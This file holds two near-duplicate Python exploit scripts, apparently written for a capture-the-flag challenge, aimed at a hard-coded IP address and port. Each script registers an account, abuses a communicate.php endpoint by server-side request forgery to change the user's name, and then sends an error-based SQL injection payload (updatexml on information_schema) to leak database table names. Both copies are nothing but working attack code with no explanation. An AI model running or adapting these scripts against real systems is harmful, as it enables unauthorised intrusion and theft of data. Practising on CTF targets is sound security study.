import re
import sys
import time
from urllib.parse import urljoin

import requests


BASE_URL = "http://94.237.55.43:36908/"


def read_current_name(session: requests.Session) -> str:
    response = session.get(BASE_URL, timeout=5)
    match = re.search(r"Yo,\s*([^<]+)</h2>", response.text)
    return match.group(1) if match else ""


def register_and_login(session: requests.Session) -> str:
    username = f"neo{time.strftime('%H%M%S')}"
    session.post(
        urljoin(BASE_URL, "register.php"),
        data={"name": "Neo", "username": username, "password": "matrix"},
        timeout=10,
    )
    session.post(
        urljoin(BASE_URL, "login.php"),
        data={"username": username, "password": "matrix"},
        timeout=10,
    )
    return username


def attempt_ssrf_edit(session: requests.Session, new_name: str, attempts: int = 60) -> bool:
    for _ in range(attempts):
        session.post(
            urljoin(BASE_URL, "communicate.php"),
            data={
                "url": "http://motherland.com",
                "data[action]": "edit",
                "data[new_name]": new_name,
            },
            timeout=5,
        )
        if read_current_name(session) == new_name:
            return True
    return False


def try_error_based_sqli(session: requests.Session) -> str:
    # Error-based injection via updatexml to force an error and leak content
    payload = (
        "' OR updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables "
        "WHERE table_schema=database()),0x7e),1) OR 'a'='a"
    )
    for _ in range(30):
        session.post(
            urljoin(BASE_URL, "communicate.php"),
            data={
                "url": "http://motherland.com",
                "data[action]": "edit",
                "data[new_name]": payload,
            },
            timeout=5,
        )
        r = session.get(BASE_URL, timeout=5)
        if ("SQL Error:" in r.text) or ("XPATH" in r.text) or ("error" in r.text.lower()):
            return r.text
    return ""


def main() -> None:
    session = requests.Session()
    username = register_and_login(session)
    print(f"user {username}")
    print(f"initial {read_current_name(session)}")

    if not attempt_ssrf_edit(session, new_name="Zed", attempts=60):
        print("ssrf_failed")
        sys.exit(0)

    leak = try_error_based_sqli(session)
    print(f"leak_len {len(leak)}")
    if leak:
        print(leak[:2000])


if __name__ == "__main__":
    main()

import requests, re, time, sys
from urllib.parse import urljoin

BASE = 'http://94.237.55.43:36908/'


def current_name(sess: requests.Session) -> str:
    r = sess.get(BASE, timeout=5)
    m = re.search(r'Yo,\s*([^<]+)</h2>', r.text)
    return m.group(1) if m else ''


def register_and_login(sess: requests.Session) -> str:
    user = f'neo{time.strftime('%H%M%S')}'
    sess.post(urljoin(BASE, 'register.php'), data={'name':'Neo','username':user,'password':'matrix'}, timeout=10)
    sess.post(urljoin(BASE, 'login.php'), data={'username':user,'password':'matrix'}, timeout=10)
    return user


def try_ssrf_edit(sess: requests.Session, new_name: str, attempts: int = 60) -> bool:
    for i in range(attempts):
        rr = sess.post(urljoin(BASE, 'communicate.php'), data={
            'url': 'http://motherland.com',
            'data[action]': 'edit',
            'data[new_name]': new_name,
        }, timeout=5)
        nm = current_name(sess)
        if nm == new_name:
            return True
    return False


def sqli_error_leak(sess: requests.Session) -> str:
    inj = "' OR updatexml(1,concat(0x7e,(SELECT group_concat(table_name) FROM information_schema.tables WHERE table_schema=database()),0x7e),1) OR 'a'='a"
    for _ in range(30):
        sess.post(urljoin(BASE, 'communicate.php'), data={
            'url': 'http://motherland.com',
            'data[action]': 'edit',
            'data[new_name]': inj,
        }, timeout=5)
        r = sess.get(BASE, timeout=5)
        if 'SQL Error:' in r.text or 'XPATH' in r.text or 'error' in r.text.lower():
            return r.text
    return ''


def main():
    s = requests.Session()
    user = register_and_login(s)
    print('user', user, flush=True)
    print('initial', current_name(s), flush=True)

    if not try_ssrf_edit(s, 'Zed', attempts=60):
        print('ssrf_failed', flush=True)
        sys.exit(0)

    leak = sqli_error_leak(s)
    print('leak_len', len(leak), flush=True)
    if leak:
        print(leak[:2000], flush=True)

if __name__ == '__main__':
    main()
